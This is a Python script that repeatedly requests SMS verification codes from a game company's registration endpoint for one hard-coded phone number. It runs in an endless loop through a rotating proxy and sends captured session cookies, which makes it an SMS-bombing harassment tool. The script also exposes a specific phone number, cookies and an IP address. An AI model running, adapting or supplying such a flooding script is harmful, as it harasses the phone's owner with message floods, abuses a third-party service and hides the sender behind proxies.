import requests

def juren(phoneNum):
    url = 'https://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=https%3A%2F%2Flogin.ztgame.com%2F&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone='+phoneNum+'&mpcode=&pwd=&tname=&idcard='

    headers = {
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'keep-alive',
        'Cookie':'lg_ucd=69d2a9378c7a9618e024380078daa5506eed768d8720ab5105b4d330ea51a334a%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22lg_ucd%22%3Bi%3A1%3Bs%3A26%3A%22hrmd1go0il7qi9jdb4sta598g7%22%3B%7D; uniqid=2210170900274807659625; ref=0; ref_date=2022-10-17+09%3A00%3A27.9397; ref_ip=61.188.17.163; AM_SESSID=9rokkqupcdqlf9q2m2mem44ph1; ucd=2c2ac4e7bcb64694bf6124942b343df504c895b34e80047f037189eee65378f7a%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22ucd%22%3Bi%3A1%3Bs%3A26%3A%229rokkqupcdqlf9q2m2mem44ph1%22%3B%7D; NSC_xfc-bmm-443_UY=ffffffffaf10bf0745525d5f4f58455e445a4a423660; NSC_xfc-bmm-443_BMJ=ffffffffaf10bf0745525d5f4f58455e445a4a423660; date=2022-10-17+09%3A20%3A51.3332; NSC_sfh.auhbnf.dpn_uy_ttm=ffffffffaf14b54145525d5f4f58455e445a4a423660',
        'Host':'reg.ztgame.com',
        'Referer':'https://reg.ztgame.com/',
        'sec-ch-ua':'"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile':'?0',
        'sec-ch-ua-platform':'"Windows"',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'X-Requested-With':'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53'}
    r = requests.get(url, headers=headers,proxies= {'http': 'p774.kdltps.com:15818', 'https': 'p774.kdltps.com:15818'})


    print('巨人结束：',phoneNum,r.text)
    print("\n")
while 1:
    juren('17311067255')